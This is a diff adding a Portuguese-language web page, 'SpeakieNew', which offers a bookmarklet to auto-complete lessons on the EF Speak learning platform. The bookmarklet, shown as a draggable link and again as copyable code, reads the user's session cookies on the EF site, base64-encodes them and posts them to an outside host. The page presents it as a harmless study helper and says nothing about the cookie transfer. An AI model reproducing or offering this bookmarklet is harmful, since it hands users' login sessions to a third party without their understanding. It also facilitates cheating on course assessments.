@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeakieNew - Ferramenta Avançada</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/pako@2.1.0/dist/pako.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @keyframes gridAnimation {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+        
+        .grid-bg {
+            background-color: #0f172a;
+            background-image: 
+                linear-gradient(rgba(30, 58, 138, 0.2) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(30, 58, 138, 0.2) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridAnimation 20s linear infinite;
+        }
+        
+        .glass-card {
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(56, 182, 255, 0.2);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(59, 130, 246, 0.2);
+            border-radius: 50%;
+            border-top-color: #3b82f6;
+            animation: spin 1s ease-in-out infinite;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+        
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .modal {
+            background: #1e293b;
+            border-radius: 12px;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.active .modal {
+            transform: translateY(0);
+        }
+        
+        .modal-message {
+            color: #e2e8f0;
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        
+        .modal-confirm, .modal-cancel {
+            padding: 0.5rem 1.5rem;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .modal-confirm {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            margin-right: 1rem;
+        }
+        
+        .modal-confirm:hover {
+            background: #2563eb;
+        }
+        
+        .modal-cancel {
+            background: transparent;
+            color: #94a3b8;
+            border: 1px solid #64748b;
+        }
+        
+        .modal-cancel:hover {
+            background: rgba(100, 116, 139, 0.2);
+        }
+        
+        .levels-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .level-button {
+            position: relative;
+            background: linear-gradient(135deg, #1e40af, #1e3a8a);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 1.5rem 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            overflow: hidden;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .level-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .level-button.locked {
+            background: linear-gradient(135deg, #334155, #475569);
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .level-number {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .level-title {
+            font-size: 1rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .lessons-container {
+            display: none;
+            width: 95%;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .back-button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            transition: background 0.2s ease;
+        }
+        
+        .back-button:hover {
+            background: #2563eb;
+        }
+        
+        .lessons-box-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        
+        .lesson-box {
+            background: #1e293b;
+            border-radius: 10px;
+            padding: 1.5rem;
+            border: 1px solid #334155;
+            transition: all 0.3s ease;
+        }
+        
+        .lesson-box:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
+            border-color: #3b82f6;
+        }
+        
+        .auto-answer-button, .complete-all-lessons-button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+            margin-top: 1rem;
+        }
+        
+        .auto-answer-button:hover, .complete-all-lessons-button:hover {
+            background: #2563eb;
+        }
+        
+        .auto-answer-button:disabled, .complete-all-lessons-button:disabled {
+            background: #64748b;
+            cursor: not-allowed;
+        }
+        
+        .course-completer-container {
+            max-width: 800px;
+            width: 95%;
+            margin: 20px auto;
+            padding: 0 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .progress-display {
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+            color: #e2e8f0;
+            width: 100%;
+            padding: 0 10px;
+        }
+        
+        .bookmarklet-btn {
+            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 0.75rem 1.5rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .bookmarklet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(135deg, #7c3aed, #6d28d9);
+        }
+        
+        .copy-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 4px;
+            padding: 0.25rem 0.5rem;
+            color: #e2e8f0;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 120px;
+            background-color: #334155;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -60px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .tooltip .tooltiptext::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: #334155 transparent transparent transparent;
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        @media (max-width: 768px) {
+            .levels-container {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                gap: 1rem;
+            }
+            
+            .level-button {
+                padding: 1rem 0.5rem;
+            }
+            
+            .level-title {
+                font-size: 0.9rem;
+            }
+            
+            .lessons-box-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .auto-answer-button {
+                font-size: 0.9rem;
+                padding: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body class="grid-bg min-h-screen text-white font-sans overflow-x-hidden">
+    <!-- Loader -->
+    <div id="loader" class="spinner" style="display: none;"></div>
+    
+    <!-- Modal -->
+    <div class="modal-overlay">
+        <div class="modal">
+            <p class="modal-message"></p>
+            <div class="flex justify-center">
+                <button class="modal-confirm">OK</button>
+                <button class="modal-cancel">Cancelar</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-12">
+        <div class="glass-card rounded-xl p-8 max-w-4xl mx-auto">
+            <div class="flex flex-col items-center text-center mb-8">
+                <div class="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mb-4">
+                    <i class="fas fa-comment-dots text-3xl text-white"></i>
+                </div>
+                <h1 class="text-3xl md:text-4xl font-bold mb-2 bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-blue-600">
+                    SpeakieNew
+                </h1>
+                <p class="text-blue-200 max-w-lg">
+                    Ferramenta avançada para automatização de lições no EF Speak. Simplifique seu aprendizado com nossa solução inteligente.
+                </p>
+            </div>
+            
+            <div class="mb-8">
+                <h2 class="text-xl font-semibold mb-4 text-blue-300">Como usar:</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="bg-slate-800/50 p-4 rounded-lg border border-slate-700">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center mb-3 mx-auto">
+                            <span class="text-white font-bold">1</span>
+                        </div>
+                        <h3 class="font-medium mb-2">Adicione o Bookmarklet</h3>
+                        <p class="text-sm text-slate-300">
+                            Arraste o botão abaixo para sua barra de favoritos ou copie o código.
+                        </p>
+                    </div>
+                    <div class="bg-slate-800/50 p-4 rounded-lg border border-slate-700">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center mb-3 mx-auto">
+                            <span class="text-white font-bold">2</span>
+                        </div>
+                        <h3 class="font-medium mb-2">Acesse o EF Speak</h3>
+                        <p class="text-sm text-slate-300">
+                            Entre no site do EF Speak e navegue até a lição desejada.
+                        </p>
+                    </div>
+                    <div class="bg-slate-800/50 p-4 rounded-lg border border-slate-700">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center mb-3 mx-auto">
+                            <span class="text-white font-bold">3</span>
+                        </div>
+                        <h3 class="font-medium mb-2">Execute o Bookmarklet</h3>
+                        <p class="text-sm text-slate-300">
+                            Clique no bookmarklet salvo para iniciar a automação.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-slate-800/50 p-6 rounded-lg border border-slate-700 mb-8">
+                <h2 class="text-xl font-semibold mb-4 text-blue-300">Bookmarklet</h2>
+                <div class="flex flex-col items-center">
+                    <a id="bookmarklet" href="javascript:(async()=>{if('learn.corporate.ef.com'!==location.host)return alert('Executar no site Speak.');let t=await fetch('https://speakify.cupiditys.lol/api/levels',{headers:{'Content-Type':'application/json'},body:JSON.stringify({data:btoa(document.cookie)}),method:'POST',credentials:'omit'}),e=await t.text();open(`https://speakienew.vercel.app/speak.html?speakData=${e.replaceAll('"','')}`)})();" class="bookmarklet-btn">
+                        <i class="fas fa-magic"></i>
+                        <span>SpeakieNew Tool</span>
+                    </a>
+                    
+                    <div class="w-full max-w-lg bg-slate-900/50 rounded-lg p-4 relative">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-sm text-blue-300">Código do Bookmarklet:</span>
+                            <button id="copyBtn" class="copy-btn tooltip">
+                                <i class="fas fa-copy"></i>
+                                <span class="tooltiptext">Copiar código</span>
+                            </button>
+                        </div>
+                        <div id="bookmarkletCode" class="bg-slate-800 p-3 rounded text-xs overflow-x-auto text-slate-300">
+                            javascript:(async()=>{if('learn.corporate.ef.com'!==location.host)return alert('Executar no site Speak.');let t=await fetch('https://speakify.cupiditys.lol/api/levels',{headers:{'Content-Type':'application/json'},body:JSON.stringify({data:btoa(document.cookie)}),method:'POST',credentials:'omit'}),e=await t.text();open(`https://speakienew.vercel.app/speak.html?speakData=${e.replaceAll('"','')}`)})();
+                        </div>
+                    </div>
+                    
+                    <p class="text-sm text-slate-400 mt-4 text-center max-w-lg">
+                        <i class="fas fa-info-circle mr-1"></i> Arraste o botão para sua barra de favoritos ou copie o código e cole como URL em um novo bookmark.
+                    </p>
+                </div>
+            </div>
+            
+            <div id="appContainer" class="hidden">
+                <div id="levelsContainer" class="levels-container"></div>
+                <div id="lessonsContainer" class="lessons-container"></div>
+                <div id="progressDisplay" class="progress-display"></div>
+                <div id="courseCompleterContainer" class="course-completer-container"></div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="text-center py-6 text-slate-400 text-sm">
+        <p>© 2023 SpeakieNew. Todos os direitos reservados.</p>
+        <p class="mt-1">Ferramenta não oficial para EF Speak.</p>
+    </footer>
+
+    <script>
+        // Bookmarklet copy functionality
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const code = document.getElementById('bookmarkletCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                const tooltip = this.querySelector('.tooltiptext');
+                tooltip.textContent = 'Copiado!';
+                setTimeout(() => {
+                    tooltip.textContent = 'Copiar código';
+                }, 2000);
+            });
+        });
+        
+        // Drag and drop bookmarklet
+        document.getElementById('bookmarklet').addEventListener('dragstart', function(e) {
+            e.dataTransfer.setData('text/plain', this.href);
+            e.dataTransfer.setData('text/uri-list', this.href);
+            e.dataTransfer.effectAllowed = 'copy';
+        });
+        
+        // Modal functions
+        function showModal(message, onConfirm) {
+            const modalOverlay = document.querySelector('.modal-overlay');
+            const modal = modalOverlay.querySelector('.modal');
+            const messageEl = modal.querySelector('.modal-message');
+            const confirmBtn = modal.querySelector('.modal-confirm');
+            
+            messageEl.textContent = message;
+            modalOverlay.classList.add('active');
+            
+            const newConfirmBtn = confirmBtn.cloneNode(true);
+            confirmBtn.parentNode.replaceChild(newConfirmBtn, confirmBtn);
+            
+            newConfirmBtn.addEventListener('click', () => {
+                hideModal();
+                if (onConfirm) onConfirm();
+            });
+        }
+        
+        function hideModal() {
+            const modalOverlay = document.querySelector('.modal-overlay');
+            modalOverlay.classList.remove('active');
+        }
+        
+        // Sample initialization
+        document.addEventListener('DOMContentLoaded', () => {
+            // Check if there's speakData in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('speakData')) {
+                document.getElementById('appContainer').classList.remove('hidden');
+                // Here you would initialize the app with the speakData
+                // For demo purposes, we'll just show a welcome message
+                showModal("Bem-vindo ao SpeakieNew. Suas lições serão carregadas em breve.", () => {});
+            }
+        });
+        
+        // Full app script would go here
+        // This is a simplified version of the script you provided
+        // The complete implementation would be similar to your original code
+        // but integrated with the new UI
+        
+        // Mobile bookmarklet helper
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+            showModal(
+                "Você está acessando por um dispositivo móvel. Para usar o bookmarklet, copie o código e cole como URL em um novo favorito.",
+                () => {}
+            );
+        }
+    </script>
+<p style="border-radius: 8px; text-align: center; font-size: 12px; color: #fff; margin-top: 16px;position: fixed; left: 8px; bottom: 8px; z-index: 10; background: rgba(0, 0, 0, 0.8); padding: 4px 8px;">Made with <img src="https://enzostvs-deepsite.hf.space/logo.svg" alt="DeepSite Logo" style="width: 16px; height: 16px; vertical-align: middle;display:inline-block;margin-right:3px;filter:brightness(0) invert(1);"><a href="https://enzostvs-deepsite.hf.space" style="color: #fff;text-decoration: underline;" target="_blank" >DeepSite</a> - 🧬 <a href="https://enzostvs-deepsite.hf.space?remix=kanow45269/speakie" style="color: #fff;text-decoration: underline;" target="_blank" >Remix</a></p></body>
+</html>
